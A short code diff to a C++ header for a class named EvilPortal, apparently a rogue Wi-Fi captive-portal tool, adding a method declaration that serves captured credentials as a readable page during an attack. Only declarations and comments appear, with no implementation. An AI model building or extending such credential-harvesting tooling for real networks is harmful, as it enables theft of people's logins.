@@ -266,6 +266,9 @@ class EvilPortal {
     // mainManagement() can run it too: main() is not dispatched in this build,
     // which left captured credentials sitting in RAM and discarded.
     void flushCapturedCreds();
+    // Render captures.json as a readable page. Registered on both the evil AP
+    // and the management panel so captures can be read during an attack.
+    void serveCredsPage();
 
 };
 
